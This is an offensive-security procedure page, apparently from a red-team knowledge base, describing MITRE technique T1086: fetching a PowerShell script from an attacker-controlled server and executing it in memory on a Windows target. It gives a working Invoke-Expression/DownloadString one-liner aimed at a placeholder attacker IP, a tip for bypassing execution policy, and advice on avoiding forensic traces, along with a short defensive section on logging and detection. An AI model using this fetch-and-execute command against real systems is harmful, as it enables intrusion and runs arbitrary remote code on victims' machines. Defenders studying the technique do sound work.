---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/PowerShell|T1086 - PowerShell]]'
sub_techniques: []
tags:
  - network
  - powershell
commands:
  - '[[commands/powershell-invoke-expression-download-string]]'
platforms:
  - Windows
tools: []
skill_level: beginner
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Download and Execute Remote PowerShell Script

## Summary

This procedure uses PowerShell's Invoke-Expression cmdlet in combination with the Net.WebClient.DownloadString method to download a .ps1 script from a remote HTTP server and execute it directly in memory on a Windows target. It enables attackers to run arbitrary code without saving files to disk, bypassing some endpoint detection rules and execution policies if bypassed.

## Description

In scenarios where an attacker has initial command execution on a Windows host (e.g., via phishing or credential compromise), this technique allows loading and running malicious PowerShell scripts hosted on an attacker-controlled server. The DownloadString method fetches the script content over HTTP as a string, which is then passed to Invoke-Expression for immediate evaluation. This is particularly useful for post-exploitation tasks like downloading additional tools, establishing persistence, or exfiltrating data. It requires outbound HTTP access and PowerShell version 2.0 or higher. Potential issues include execution policy restrictions (e.g., Restricted mode blocks it), which can be bypassed with parameters like -ExecutionPolicy Bypass if needed. The technique maps to MITRE ATT&CK Execution tactic via PowerShell usage and is common in red team operations for its simplicity and low footprint.

## Requirements

1. PowerShell 2.0 or higher installed on the target Windows system.
2. Outbound network access from the target to the attacker's HTTP server (typically port 80 or 443).
3. Ability to execute PowerShell commands (e.g., via cmd.exe spawning powershell.exe or direct PS access).
4. The remote .ps1 script must be accessible via HTTP and contain valid PowerShell code.
5. Optional: Bypass for execution policy if set to Restricted (e.g., using powershell.exe -ExecutionPolicy Bypass).

## Defense

Defensive measures and detection strategies:

- Enable PowerShell logging (Module, ScriptBlock, and Transcription logging) via Group Policy to capture invoked commands and downloaded content.
- Monitor network traffic for suspicious outbound HTTP requests from PowerShell processes to unknown domains or IPs, using tools like Windows Defender ATP or SIEM rules.
- Implement application whitelisting (e.g., AppLocker) to restrict PowerShell script execution and block unsigned scripts.
- Use constrained language mode in PowerShell to limit access to .NET classes like Net.WebClient.
- Endpoint detection rules for processes spawning PowerShell with web download patterns (e.g., via Sysmon Event ID 1 with command line matching).

## Objectives

1. Download a remote PowerShell script without writing it to disk.
2. Execute the script in memory to perform further actions like payload deployment or reconnaissance.
3. Maintain operational security by avoiding file-based artifacts on the target.

## Instructions

### Step 1: Prepare the Remote Script

**Context**: Before execution, ensure the malicious .ps1 script is hosted on an attacker-controlled web server accessible via HTTP. This script could contain commands for reverse shell establishment, data exfiltration, or tool downloads. Test the URL accessibility from a similar network to confirm no firewall blocks.

No specific command is needed here; use a web server like Python's SimpleHTTPServer or Apache to host the file.

> Verify by curling the URL from another machine: expected output is the raw .ps1 content without errors.

### Step 2: Download and Execute the Script

**Context**: From the target system, invoke the command to fetch and run the script. This step assumes you have a shell (cmd or PowerShell) on the target. If execution policy blocks it, prepend with powershell.exe -ExecutionPolicy Bypass -Command "...".

**Command** ([[commands/powershell-invoke-expression-download-string]]):
```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://$_ATTACKER_IP/$_FILENAME.ps1")
```

> This creates a new Net.WebClient object, downloads the script as a string from the specified URL, and pipes it to Invoke-Expression, which parses and executes it as PowerShell code. The WHY: It avoids local file creation, reducing forensic footprints. Expected output: The results of the script's execution (e.g., if the script runs whoami, it displays the current user); errors may indicate network issues, policy blocks, or invalid script syntax. Success is confirmed if the script's intended actions complete without exceptions.
